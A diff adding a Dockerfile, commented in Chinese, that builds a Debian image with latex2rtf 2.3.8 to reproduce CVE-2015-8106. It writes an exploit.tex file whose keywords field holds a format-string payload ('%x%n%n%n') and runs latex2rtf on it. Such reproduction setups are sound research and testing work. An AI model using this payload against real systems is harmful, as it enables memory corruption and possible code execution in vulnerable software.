@@ -1,0 +1,23 @@
+#创建CVE-2015-8106漏洞镜像
+#Dockerfile示例
+FROM debian:latest
+RUN apt-get update \
+    && apt-get upgrade -y \
+    && apt-get install -y wget \
+    && apt-get install -y build-essential \
+    && apt-get install -y texinfo \
+    && cd home \
+    && wget -O latex2rtf2.3.8.tar.gz \
+    https://sourceforge.net/projects/latex2rtf/files/latex2rtf-unix/2.3.8/latex2rtf-2.3.8.tar.gz/download \
+    && tar -xvf latex2rtf2.3.8.tar.gz \
+    && cd latex2rtf-2.3.8 \
+    && make && make install || : && make check || : && make install \
+    && cd /home \
+    && touch exploit.tex \
+    && echo '\\documentclass{article}\n\
+    \\begin{document}\n\
+    \\title{Exploitable}\n\
+    \\author{Jong-Gwon Kim}\n\
+    \\keywords{\\%x\\%n\\%n\\%n}\n\
+    \\end{document}' > exploit.tex
+CMD cd /home && latex2rtf exploit.tex
